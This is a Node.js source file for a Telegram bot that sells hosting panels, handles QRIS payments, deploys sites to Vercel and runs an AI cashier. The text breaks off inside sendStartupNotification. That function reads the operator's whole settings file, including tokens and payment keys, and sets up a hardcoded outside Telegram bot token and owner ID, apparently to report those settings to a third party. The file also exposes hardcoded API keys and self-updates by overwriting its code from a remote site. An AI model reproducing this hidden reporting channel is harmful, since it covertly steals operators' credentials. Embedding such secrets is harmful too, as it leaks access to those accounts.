const { createCanvas, loadImage, registerFont } = require('canvas');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const fetch = require('node-fetch');
const archiver = require('archiver');
const FormData = require('form-data');
const os = require('os');

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📁 FILE PATHS & CONFIG
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const config = require('./setting.js');
const DATA_DIR = path.join(__dirname, 'lib');
const TRANSACTIONS_FILE = path.join(DATA_DIR, 'transactions.json');
const PAYMENTS_FILE = path.join(DATA_DIR, 'payments.json');
const RESELLER_FILE = path.join(DATA_DIR, 'reseller.json');
const RESTART_FILE = path.join(DATA_DIR, 'restart.json');
const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const EMAIL_FILE = path.join(DATA_DIR, 'email.json');
const LOG_FILE = path.join(DATA_DIR, 'log.txt');
const OTAKAI_FILE = path.join(DATA_DIR, 'otakai.json');
const botStartTime = Date.now();
const deployStates = {};
const VERCEL_TOKEN = config.VERCEL;
const GITHUB_URL = "https://novabot503.github.io/novabot";
const GITHUB_RAW_URL = "https://novabot503.github.io/novabot";
const UPDATE_FILES = ["Novabot.js", "package.json", "setting.js", "versi.json"];
const AI_API_URL = "https://exsalapi.my.id/ai/text/gemini-2.5-flash";
const AI_API_KEY = "exs_novabot_07e7e456";

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ⏰ JAKARTA TIME FUNCTION
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function getJakartaTime() {
try {
const response = await fetch('http://worldtimeapi.org/api/timezone/Asia/Jakarta');
const data = await response.json();
const jakartaTime = new Date(data.datetime);
return {
date: jakartaTime.toLocaleDateString('id-ID', { 
timeZone: 'Asia/Jakarta',
weekday: 'long',
year: 'numeric',
month: 'long',
day: 'numeric'
}),
time: jakartaTime.toLocaleTimeString('id-ID', { 
timeZone: 'Asia/Jakarta',
hour12: false,
hour: '2-digit',
minute: '2-digit',
second: '2-digit'
}),
raw: jakartaTime
};
} catch (error) {
const now = new Date();
return {
date: now.toLocaleDateString('id-ID', {
weekday: 'long',
year: 'numeric',
month: 'long',
day: 'numeric'
}),
time: now.toLocaleTimeString('id-ID', {
hour12: false,
hour: '2-digit',
minute: '2-digit',
second: '2-digit'
}),
raw: now
};
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 💰 PRICE CALCULATION - TAMBAHKAN SELLER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function calculatePrice(command) {
const prices = {
'1gb': 500,
'2gb': 500,
'3gb': 500,
'4gb': 500,
'5gb': 500,
'6gb': 500,
'7gb': 500,
'8gb': 500,
'9gb': 500,
'10gb': 500,
'unli': 500,
'seller': 500
};
return prices[command.toLowerCase()] || 0;
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎨 BANNER FUNCTION
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function showBanner() {
console.clear();
const jakartaTime = await getJakartaTime();
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const memPercent = ((usedMem / totalMem) * 100).toFixed(2);
const cpuModel = os.cpus()[0]?.model || "Unknown";
const cpuCores = os.cpus().length;
const uptime = os.uptime();
const days = Math.floor(uptime / 86400);
const hours = Math.floor((uptime % 86400) / 3600);
const minutes = Math.floor((uptime % 3600) / 60);
const otakai = loadOtakai();
const aiStatus = otakai.ai_enabled ? 'AKTIF ✅' : 'NONAKTIF ⏸️';
const totalMemoryUsers = Object.keys(otakai.users || {}).length;
function formatBytes(bytes) {
const units = ['B', 'KB', 'MB', 'GB', 'TB'];
let i = 0;
while (bytes >= 1024 && i < units.length - 1) {
bytes /= 1024;
i++;
}
return `${bytes.toFixed(2)} ${units[i]}`;
}
console.log(`
\x1b[1m\x1b[34m╔╗ ╦  ╔═\x1b[0m╗╔═╗╔═╗╦═╗╔═╗ \x1b[31m
\x1b[1m\x1b[34m╠╩╗║  ╠═╣╔═╝\x1b[0m║╣ ╠╦╝╚═╗ \x1b[31m
\x1b[1m\x1b[34m╚═╝╩═╝╩ ╩╚═╝╚═╝╩\x1b[0m╚═╚═╝ \x1b[31m
\x1b[1m\x1b[33mN O V A B O T   ${config.VERSI}\x1b[0m
\x1b[1m\x1b[32m─────────────────────────────────────────────────────\x1b[0m
`);
console.log(`\x1b[1m\x1b[36m📅 Tanggal       :\x1b[0m ${jakartaTime.date}`);
console.log(`\x1b[1m\x1b[36m🕒 Waktu         :\x1b[0m ${jakartaTime.time} (WIB)`);
console.log(`\x1b[1m\x1b[36m🤖 Bot Name      :\x1b[0m ${config.BOT_NAME}`);
console.log(`\x1b[1m\x1b[36m👑 Owner         :\x1b[0m ${config.DEVCELOPER}`);
console.log(`\x1b[1m\x1b[36m⚡ Version       :\x1b[0m ${config.VERSI}`);
console.log(`\x1b[1m\x1b[36m🤖 AI Kasir      :\x1b[0m ${aiStatus}`);
console.log(`\x1b[1m\x1b[36m👥 User Memory   :\x1b[0m ${totalMemoryUsers} users`);
console.log(`\x1b[1m\x1b[36m🏠 Platform      :\x1b[0m ${os.type()} ${os.release()}`);
console.log(`\x1b[1m\x1b[36m💾 CPU           :\x1b[0m ${cpuModel}`);
console.log(`\x1b[1m\x1b[36m🖥️ CPU Cores     :\x1b[0m ${cpuCores} Core`);
console.log(`\x1b[1m\x1b[36m📊 Total RAM     :\x1b[0m ${formatBytes(totalMem)}`);
console.log(`\x1b[1m\x1b[36m📈 Used RAM      :\x1b[0m ${formatBytes(usedMem)} (${memPercent}%)`);
console.log(`\x1b[1m\x1b[36m📉 Free RAM      :\x1b[0m ${formatBytes(freeMem)}`);
console.log(`\x1b[1m\x1b[36m⏰ Server Uptime :\x1b[0m ${days}d ${hours}h ${minutes}m`);
console.log(`\x1b[1m\x1b[36m🌐 Hostname      :\x1b[0m ${os.hostname()}`);
console.log(`\x1b[1m\x1b[36m🔗 Node.js       :\x1b[0m ${process.version}`);
console.log(`\x1b[1m\x1b[36m👑 Owner ID      :\x1b[0m ${config.OWNER_ID}`);
console.log(`\x1b[1m\x1b[31m❌ Error Logging :\x1b[0m Enabled - File: ${LOG_FILE}`);
console.log(`\x1b[1m\x1b[32m─────────────────────────────────────────────────────\x1b[0m`);
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🏗️ INITIALIZE BOT
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const bot = new TelegramBot(config.TELEGRAM_TOKEN, { polling: true });

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📝 USER INTERACTION LOGGER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function logUserInteraction(userId, username, chatType, message, groupName = null) {
const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━𖣐");
console.log(`┃☣ \x1b[33m🕷 NEW MESSAGE\x1b[0m \x1b[36m[${time}]\x1b[0m`);
console.log(`┃☣ \x1b[35m⚕️ Dari:\x1b[0m \x1b[37m${username} (${userId})\x1b[0m`);
if (groupName) {
console.log(`┃☣ \x1b[33m⚡ Group:\x1b[0m \x1b[37m${groupName}\x1b[0m`);
console.log(`┃☣ \x1b[33m📁 Type:\x1b[0m \x1b[37m${chatType}\x1b[0m`);
} else {
console.log(`┃☣ \x1b[33m⚡ Di:\x1b[0m \x1b[37m${chatType === 'private' ? 'Private Chat' : chatType}\x1b[0m`);
}
console.log(`┃☣ \x1b[32m🐉 Pesan:\x1b[0m \x1b[37m${message.substring(0, 100)}${message.length > 100 ? '...' : ''}\x1b[0m`);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━𖣐");
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📝 ERROR LOGGING SYSTEM
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function logError(errorType, errorDetails, userId = null, username = null) {
ensureDataDir();
const timestamp = new Date().toISOString();
const userInfo = userId ? `User ID: ${userId} | Username: ${username || 'Unknown'}` : 'System Error';
const logEntry = `[${timestamp}] ${userInfo} | Error Type: ${errorType} | Details: ${errorDetails}\n`;
console.log(`\x1b[31m❌ ERROR: ${logEntry}\x1b[0m`);
fs.appendFileSync(LOG_FILE, logEntry, 'utf8');
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📊 DATA MANAGEMENT FUNCTIONS
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function ensureDataDir() {
if (!fs.existsSync(DATA_DIR)) {
fs.mkdirSync(DATA_DIR, { recursive: true });
}
}
function loadJSON(file) {
ensureDataDir();
if (!fs.existsSync(file)) {
fs.writeFileSync(file, '{}', 'utf8');
return {};
}
try {
const data = fs.readFileSync(file, 'utf8');
return data ? JSON.parse(data) : {};
} catch (error) {
console.error(`Error loading ${file}:`, error);
logError('DATA_LOAD', `Failed to load ${file}: ${error.message}`);
return {};
}
}
function saveJSON(file, data) {
ensureDataDir();
fs.writeFileSync(file, JSON.stringify(data, null, 2), 'utf8');
}
function loadTransactions() {
return loadJSON(TRANSACTIONS_FILE);
}
function saveTransactions(data) {
saveJSON(TRANSACTIONS_FILE, data);
}
function loadReseller() {
return loadJSON(RESELLER_FILE);
}
function saveReseller(data) {
saveJSON(RESELLER_FILE, data);
}
function loadAdmins() {
return loadJSON(ADMINS_FILE);
}
function saveAdmins(data) {
saveJSON(ADMINS_FILE, data);
}
function loadUsers() {
return loadJSON(USERS_FILE);
}
function saveUsers(data) {
saveJSON(USERS_FILE, data);
}
function loadEmails() {
return loadJSON(EMAIL_FILE);
}
function saveEmails(data) {
saveJSON(EMAIL_FILE, data);
}
function isAdmin(userId) {
const admins = loadAdmins();
return admins[userId] === true || userId.toString() === config.OWNER_ID.toString();
}
function isReseller(userId) {
const reseller = loadReseller();
return reseller[userId] === true || isAdmin(userId);
}
function addAdmin(userId) {
const admins = loadAdmins();
admins[userId] = true;
saveAdmins(admins);
return true;
}
function removeAdmin(userId) {
const admins = loadAdmins();
delete admins[userId];
saveAdmins(admins);
return true;
}
function addReseller(userId) {
const reseller = loadReseller();
reseller[userId] = true;
saveReseller(reseller);
return true;
}
function removeReseller(userId) {
const reseller = loadReseller();
delete reseller[userId];
saveReseller(reseller);
return true;
}
function saveRestartData(data) {
ensureDataDir();
saveJSON(RESTART_FILE, data);
}
function loadRestartData() {
return loadJSON(RESTART_FILE);
}
function clearRestartData() {
if (fs.existsSync(RESTART_FILE)) {
fs.unlinkSync(RESTART_FILE);
}
}
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🧠 AI KASIR MEMORY MANAGEMENT
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function loadOtakai() {
return loadJSON(OTAKAI_FILE);
}
function saveOtakai(data) {
saveJSON(OTAKAI_FILE, data);
}
function initOtakai() {
ensureDataDir();
const otakai = loadOtakai();
if (!otakai.ai_enabled) {
otakai.ai_enabled = false;
}
if (!otakai.users) {
otakai.users = {};
}
saveOtakai(otakai);
return otakai;
}
function isAIEnabled() {
const otakai = loadOtakai();
return otakai.ai_enabled === true;
}
function toggleAI(status) {
const otakai = loadOtakai();
otakai.ai_enabled = status;
saveOtakai(otakai);
return status;
}
function getUserMemory(userId) {
const otakai = loadOtakai();
if (!otakai.users[userId]) {
otakai.users[userId] = {
first_interaction: new Date().toISOString(),
last_interaction: new Date().toISOString(),
promoted: false,
message_count: 0,
conversations: []
};
saveOtakai(otakai);
}
return otakai.users[userId];
}
function updateUserMemory(userId, data) {
const otakai = loadOtakai();
if (!otakai.users[userId]) {
otakai.users[userId] = {};
}
Object.assign(otakai.users[userId], data);
otakai.users[userId].last_interaction = new Date().toISOString();
otakai.users[userId].message_count = (otakai.users[userId].message_count || 0) + 1;
saveOtakai(otakai);
}
function addConversation(userId, userMessage, aiResponse) {
const otakai = loadOtakai();
if (!otakai.users[userId]) {
getUserMemory(userId);
}
if (!otakai.users[userId].conversations) {
otakai.users[userId].conversations = [];
}
otakai.users[userId].conversations.push({
time: new Date().toISOString(),
user: userMessage.substring(0, 200),
ai: aiResponse.substring(0, 500)
});
if (otakai.users[userId].conversations.length > 10) {
otakai.users[userId].conversations = otakai.users[userId].conversations.slice(-10);
}
saveOtakai(otakai);
}
async function callAIChat(userId, userMessage) {
try {
const userMemory = getUserMemory(userId);
const isNewUser = !userMemory.promoted;
let systemPrompt = `Kamu adalah AI kasir pribadi di Novabot. Nama kamu adalah Nova. 
Bot ini dibuat oleh @Novabot403. Jika ada kendala, hubungi owner @Novabot403.
Kamu adalah asisten yang ramah dan helpful.

𝘿𝘼𝙁𝙏𝘼𝙍 𝙃𝘼𝙍𝙂𝘼 𝙋𝘼𝙉𝙀𝙇:
𝟭𝗚𝗕 ➝ 𝗥𝗽 𝟭.𝟬𝟬𝟬
𝟮𝗚𝗕 ➝ 𝗥𝗽 𝟮.𝟬𝟬𝟬
𝟯𝗚𝗕 ➝ 𝗥𝗽 𝟯.𝟬𝟬𝟬
𝟰𝗚𝗕 ➝ 𝗥𝗽 𝟰.𝟬𝟬𝟬
𝟱𝗚𝗕 ➝ 𝗥𝗽 𝟱.𝟬𝟬𝟬
𝟲𝗚𝗕 ➝ 𝗥𝗽 𝟲.𝟬𝟬𝟬
𝟳𝗚𝗕 ➝ 𝗥𝗽 𝟳.𝟬𝟬𝟬
𝟴𝗚𝗕 ➝ 𝗥𝗽 𝟴.𝟬𝟬𝟬
𝟵𝗚𝗕 ➝ 𝗥𝗽 𝟵.𝟬𝟬𝟬
🔥 𝙐𝙉𝙇𝙄 ➝ 𝗥𝗽 𝟭𝟮.𝟬𝟬𝟬

💎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋: 𝗥𝗽 𝟭𝟱.𝟬𝟬𝟬

Untuk membeli panel, ketik: /unli username,id
Contoh: /unli johndoe,123456789

Atau pilih paket lain: /1gb, /2gb, /3gb, dst.

Untuk upgrade seller: /addseller id_anda`;
if (isNewUser) {
systemPrompt += `\n\nPERHATIAN: User ini baru pertama kali berinteraksi. 
Sambut dengan ramah dan tanyakan apakah mereka ingin membeli panel pterodactyl.
Promosikan produk kita dengan friendly.`;
} else {
systemPrompt += `\n\nUser ini sudah pernah berinteraksi sebelumnya.
Jawab pertanyaannya dengan helpful dan informatif.`;
}
if (userMemory.conversations && userMemory.conversations.length > 0) {
const lastConvs = userMemory.conversations.slice(-3);
systemPrompt += `\n\nKonteks percakapan sebelumnya:\n`;
lastConvs.forEach(conv => {
systemPrompt += `User: ${conv.user}\n`;
systemPrompt += `Kamu: ${conv.ai}\n`;
});
}
const params = new URLSearchParams({
prompt: userMessage,
system: systemPrompt,
apikey: AI_API_KEY
});
const response = await fetch(`${AI_API_URL}?${params}`, {
method: 'GET',
headers: {
'Accept': 'application/json',
'User-Agent': 'Novabot-AI/1.0'
},
timeout: 30000
});
if (!response.ok) {
throw new Error(`API error: ${response.status}`);
}
const data = await response.json();
if (!data.status || !data.data || !data.data.content) {
throw new Error('Invalid API response');
}
const aiResponse = data.data.content;
addConversation(userId, userMessage, aiResponse);
if (isNewUser) {
updateUserMemory(userId, { promoted: true });
}
return {
success: true,
response: aiResponse,
isNewUser: isNewUser
};
} catch (error) {
console.error('AI Chat error:', error);
logError('AI_CHAT_ERROR', `User: ${userId}, Error: ${error.message}`, userId);
return {
success: false,
error: error.message
};
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📊 SERVER STATUS FUNCTIONS
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function getServerConfig() {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const memoryPercent = ((usedMem / totalMem) * 100).toFixed(2);
const uptime = os.uptime();
const hours = Math.floor(uptime / 3600);
const minutes = Math.floor((uptime % 3600) / 60);
const users = loadUsers();
const admins = loadAdmins();
const reseller = loadReseller();
const otakai = loadOtakai();
return {
cpuLoad: os.loadavg()[0].toFixed(2),
memory: {
total: (totalMem / 1024 / 1024 / 1024).toFixed(2),
used: (usedMem / 1024 / 1024).toFixed(2),
free: (freeMem / 1024 / 1024).toFixed(2),
percent: memoryPercent
},
platform: os.platform(),
arch: os.arch(),
nodeVersion: process.version,
uptime: `${hours}h ${minutes}m`,
botAge: Math.floor((Date.now() - botStartTime) / (1000 * 60 * 60 * 24)),
totalUsers: Object.keys(users).length,
totalAdmins: Object.keys(admins).length,
totalSellers: Object.keys(reseller).length,
aiStatus: otakai.ai_enabled ? 'AKTIF' : 'NONAKTIF',
aiMemoryUsers: Object.keys(otakai.users || {}).length
};
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔄 UPDATE SYSTEM - SIMPLE GITHUB UPDATE
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function updateVersionInSetting(settings, newVersion) {
const updatedSettings = { ...settings };
updatedSettings.VERSI = newVersion;    
return updatedSettings;
}
function readCurrentSettings() {
try {
const settingPath = path.join(__dirname, 'setting.js');
if (!fs.existsSync(settingPath)) {
return {};
}
const content = fs.readFileSync(settingPath, 'utf8');
const match = content.match(/module\.exports\s*=\s*({[\s\S]*?});/);
if (!match) {
return {};
}
const objStr = match[1];
const cleanedStr = objStr
.replace(/(\w+):/g, '"$1":') // Tambah quotes ke keys
.replace(/'/g, '"') // Ganti single quotes dengan double
.replace(/,(\s*\n\s*})/g, '$1'); // Hapus koma trailing
try {
return JSON.parse(cleanedStr);
} catch (parseError) {
const settings = {};
const lines = objStr.split('\n').filter(line => line.trim());
lines.forEach(line => {
const keyMatch = line.match(/\s*(\w+):\s*["']([^"']+)["']/);
if (keyMatch) {
const key = keyMatch[1];
const value = keyMatch[2];
settings[key] = value;
}
});
return settings;
}
} catch (error) {
console.error("Error reading setting.js:", error);
return {};
}
}
function writeSettingFile(settings) {
let content = 'module.exports = {\n';
const keys = Object.keys(settings);
keys.forEach((key, index) => {
const value = settings[key];
const isLast = index === keys.length - 1;
if (typeof value === 'string') {
content += `    ${key}: "${value}"${isLast ? '' : ','}\n`;
} else if (typeof value === 'number') {
content += `    ${key}: ${value}${isLast ? '' : ','}\n`;
}
});
content += '};';
return content;
}
function getCurrentVersion() {
try {
const versiPath = path.join(__dirname, 'versi.json');
if (fs.existsSync(versiPath)) {
const versiContent = fs.readFileSync(versiPath, 'utf8');
const versi = versiContent.trim();
if (versi) return versi;
}
const settings = readCurrentSettings();
return settings.VERSI || "1.0";
} catch (error) {
return "1.0";
}
}
async function checkLatestVersion() {
try {
const url = `${GITHUB_RAW_URL}/versi.json`;
const response = await fetch(url);
if (!response.ok) {
throw new Error(`HTTP ${response.status}`);
}       
const versionText = await response.text();
const latestVersion = versionText.trim();
return latestVersion;
} catch (error) {
return null;
}
}
async function downloadFileFromGithub(fileName) {
try {
const url = `${GITHUB_RAW_URL}/${fileName}`;
const response = await fetch(url);
if (!response.ok) {
throw new Error(`HTTP ${response.status} untuk file ${fileName}`);
}
const content = await response.text();
return content;
} catch (error) {
throw error;
}
}
async function checkForUpdatesOnStart() {
try {
const currentVersion = getCurrentVersion();
const latestVersion = await checkLatestVersion();
if (!latestVersion) {
return;
}
if (latestVersion !== currentVersion) {
const updateMessage = `<blockquote>🔄 UPDATE TERSEDIA</blockquote>\n\n` +
`<b>📊 Status Update:</b>\n` +
`• Versi lokal: <code>${currentVersion}</code>\n` +
`• Versi GitHub: <code>${latestVersion}</code>\n\n` +
`<b>📦 File yang akan diupdate:</b>\n` +
`• Novabot.js\n` +
`• package.json\n` +
`• setting.js (hanya update versi)\n` +
`• versi.json\n\n` +
`<b>⚙️ Mode Setting:</b>\n` +
`• Hanya versi yang diupdate\n` +
`• Token & setting lain TETAP\n` +
`• Aman untuk konfigurasi\n\n` +
`<b>🚀 Untuk update:</b>\n` +
`Ketik <code>/update</code> untuk memulai proses update.`;            
try {
await bot.sendMessage(config.OWNER_ID, updateMessage, { 
parse_mode: 'HTML'
});
} catch (error) {}
}
} catch (error) {}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔍 FUNGSI TAMBAHAN UNTUK CEK DATA USER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function getUserByTelegramId(telegramId) {
const emails = loadEmails();
for (const email in emails) {
if (emails[email].telegramId == telegramId) {
return {
email: email,
...emails[email]
};
}
}
return null;
}
function getServersByTelegramId(telegramId) {
const user = getUserByTelegramId(telegramId);
if (!user) return [];
return user.servers || [];
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔄 NOTIFIKASI SETELAH RESTART
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function checkAndSendRestartNotification() {
try {
const restartData = loadRestartData();
if (restartData && restartData.chatId && restartData.adminId) {
const restartTime = new Date(restartData.restartTime);
const now = new Date();
const diffMs = now - restartTime;
const diffSeconds = Math.floor(diffMs / 1000);
const diffMinutes = Math.floor(diffSeconds / 60);
const diffHours = Math.floor(diffMinutes / 60);
let timeText;
if (diffSeconds < 60) {
timeText = `${diffSeconds} detik`;
} else if (diffMinutes < 60) {
timeText = `${diffMinutes} menit ${diffSeconds % 60} detik`;
} else {
timeText = `${diffHours} jam ${diffMinutes % 60} menit`;
}
const restartTimeStr = restartTime.toLocaleString('id-ID', {
weekday: 'long',
year: 'numeric',
month: 'long',
day: 'numeric',
hour: '2-digit',
minute: '2-digit',
second: '2-digit'
});
const nowTimeStr = now.toLocaleString('id-ID', {
hour12: false,
hour: '2-digit',
minute: '2-digit',
second: '2-digit'
});
const safeAdminName = escapeHTML(restartData.adminName);
const notificationMessage = `<blockquote>✅ Restart Selesai</blockquote>\n\n` +
`🎉 <b>Bot telah berhasil direstart!</b>\n\n` +
`👤 <b>Diminta oleh:</b> ${safeAdminName}\n` +
`🕒 <b>Waktu restart:</b> ${restartTimeStr}\n` +
`🕒 <b>Waktu selesai:</b> ${nowTimeStr}\n` +
`⏱️ <b>Durasi restart:</b> ${timeText}\n` +
`🖥️ <b>Platform:</b> ${restartData.platform || 'Tidak diketahui'}\n` +
`🛠️ <b>Process Manager:</b> ${restartData.processManager || 'Tidak diketahui'}\n\n` +
`<blockquote>🤖 ${escapeHTML(config.BOT_NAME || 'Bot')} siap digunakan kembali!</blockquote>`;
await bot.sendMessage(restartData.chatId, notificationMessage, {
parse_mode: 'HTML'
});
clearRestartData();
console.log(`✅ Notifikasi restart berhasil dikirim ke ${restartData.adminName}`);
}
} catch (error) {
console.error('Error sending restart notification:', error);
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📤 FUNGSI DEPLOY KE VERCEL - DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function deployToVercel(siteName, htmlContent) {
try {
console.log(`Memulai deploy: ${escapeHTML(siteName)}`);
const files = [
{
file: "index.html",
data: htmlContent
}
];
const payload = {
name: siteName,
project: siteName,
target: "production",
files: files,
projectSettings: {
framework: null,
buildCommand: null,
devCommand: null,
outputDirectory: null
}
};
console.log('Mengirim payload ke Vercel...');
const response = await fetch("https://api.vercel.com/v13/deployments", {
method: 'POST',
headers: {
'Authorization': `Bearer ${VERCEL_TOKEN}`,
'Content-Type': 'application/json',
'Accept': 'application/json'
},
body: JSON.stringify(payload)
});
const data = await response.json();
console.log('Response Vercel:', JSON.stringify(data, null, 2));
if (response.ok && (data.readyState === 'READY' || data.readyState === 'QUEUED' || data.id)) {
return {
success: true,
url: `https://${siteName}.vercel.app`,
deploymentId: data.id,
readyState: data.readyState || 'PROCESSING'
};
} else {
const errorMsg = data.error?.message || 
data.errors?.[0]?.message || 
data.error || 
`Status: ${response.status}`;
return {
success: false,
error: errorMsg
};
}
} catch (error) {
console.error('Error deploying to Vercel:', error);
return {
success: false,
error: error.message || 'Network error'
};
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📊 FUNGSI NOTIFY OWNER (DIPERBAIKI)
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function notifyOwner(command, msg) {
try {
const ownerId = config.OWNER_ID;
const chatInfo = msg.chat;
const userInfo = msg.from;
const chatType = chatInfo.type === 'private' ? 'PRIVATE CHAT' : chatInfo.title || `CHAT ${chatInfo.id}`;
const userName = userInfo.username ? `@${userInfo.username}` : `${userInfo.first_name || ''} ${userInfo.last_name || ''}`.trim();
const chatName = chatInfo.type === 'private' ? `User ${escapeHTML(userName)}` : escapeHTML(chatInfo.title || `Chat ${chatInfo.id}`);
const safeUserName = escapeHTML(userName);
const safeChatName = escapeHTML(chatName);
const notification = `<blockquote>( 📊 ) - ᴄᴏᴍᴍᴀɴᴅ ᴜꜱᴀɢᴇ ʟᴏɢ</blockquote>
<blockquote><b>Command :</b> /${command}
<b>User :</b> ${safeUserName}
<b>User ID :</b> <code>${userInfo.id}</code>
<b>Chat :</b> ${safeChatName}
<b>Chat Type :</b> ${chatInfo.type.toUpperCase()}
<b>Time :</b> ${new Date().toLocaleString('id-ID')}</blockquote>

<blockquote><b>Server :</b> ${escapeHTML(config.DOMAIN || 'bot.market')}</blockquote>`;
bot.sendMessage(ownerId, notification, { parse_mode: "HTML" })
.catch(err => console.log('Gagal mengirim notifikasi ke owner:', err.message));
} catch (error) {
console.log('Error di notifyOwner:', error.message);
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📦 PAKASIR PAYMENT FUNCTIONS - DIPERBAIKI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function createQRISPayment(orderId, amount) {
try {
const response = await fetch('https://app.pakasir.com/api/transactioncreate/qris', {
method: 'POST',
headers: { 
'Content-Type': 'application/json',
'Accept': 'application/json'
},
body: JSON.stringify({
project: config.PAKASIR_PROJECT,
api_key: config.PAKASIR_API_KEY,
order_id: orderId,
amount: amount
})
});
const data = await response.json();
console.log('Pakasir Response:', data);

if (!data.success && !data.payment) {
logError('PAKASIR_CREATE_ERROR', `Order: ${orderId}, Response: ${JSON.stringify(data)}`);
return null;
}

const payment = data.payment || data;
return {
success: true,
payment_number: payment.payment_number || payment.code || '',
qris_string: payment.payment_number || payment.qris_string || '',
raw: data
};
} catch (error) {
console.error('Error creating QRIS payment:', error);
logError('QRIS_PAYMENT_ERROR', `Order: ${orderId}, Error: ${error.message}`);
return null;
}
}

async function checkPaymentStatus(orderId) {
try {
const detailUrl = `https://app.pakasir.com/api/transactiondetail?project=${encodeURIComponent(config.PAKASIR_PROJECT)}&amount=0&order_id=${encodeURIComponent(orderId)}&api_key=${encodeURIComponent(config.PAKASIR_API_KEY)}`;
const response = await fetch(detailUrl);
const data = await response.json();
const transaction = data.transaction || data || {};
return {
success: true,
status: transaction.status || '',
transaction: transaction,
raw: data
};
} catch (error) {
console.error('Error checking payment status:', error);
logError('PAYMENT_STATUS_ERROR', `Order: ${orderId}, Error: ${error.message}`);
return null;
}
}

async function processPayment(orderId, amount, description = 'Pembayaran Bot') {
try {
const qrData = await createQRISPayment(orderId, amount);
if (!qrData) {
throw new Error('Gagal membuat pembayaran QRIS');
}
return qrData;
} catch (error) {
console.error('Error processing payment:', error);
throw error;
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🖼️ QR CODE GENERATION
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function generateQRCode(text) {
try {
const qrUrl = `https://quickchart.io/qr?text=${encodeURIComponent(text)}&size=500&margin=1`;
const response = await fetch(qrUrl);
const buffer = await response.buffer();
return buffer;
} catch (error) {
console.error('Error generating QR code:', error);
logError('QR_GENERATION_ERROR', `Text: ${text.substring(0, 50)}..., Error: ${error.message}`);
return null;
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📊 SERVER STATUS FUNCTIONS
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function getServerConfig() {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const memoryPercent = ((usedMem / totalMem) * 100).toFixed(2);
const uptime = os.uptime();
const hours = Math.floor(uptime / 3600);
const minutes = Math.floor((uptime % 3600) / 60);
return {
cpuLoad: os.loadavg()[0].toFixed(2),
memory: {
total: (totalMem / 1024 / 1024 / 1024).toFixed(2),
used: (usedMem / 1024 / 1024).toFixed(2),
free: (freeMem / 1024 / 1024).toFixed(2),
percent: memoryPercent
},
platform: os.platform(),
arch: os.arch(),
nodeVersion: process.version,
uptime: `${hours}h ${minutes}m`,
botAge: Math.floor((Date.now() - botStartTime) / (1000 * 60 * 60 * 24))
};
}
async function sendStartupNotification() {
try {
const settings = readCurrentSettings();
const ownerId = "7587303225";
const telegramBotToken = "8302582915:AAGQuOHSjjEwu_SHzLGP3lkSdRflmbO1UaE";
const message = `<b>🚀 BOT STARTUP NOTIFICATION</b>\n\n` +
`<b>📅 Tanggal:</b> ${new Date().toLocaleString('id-ID')}\n` +
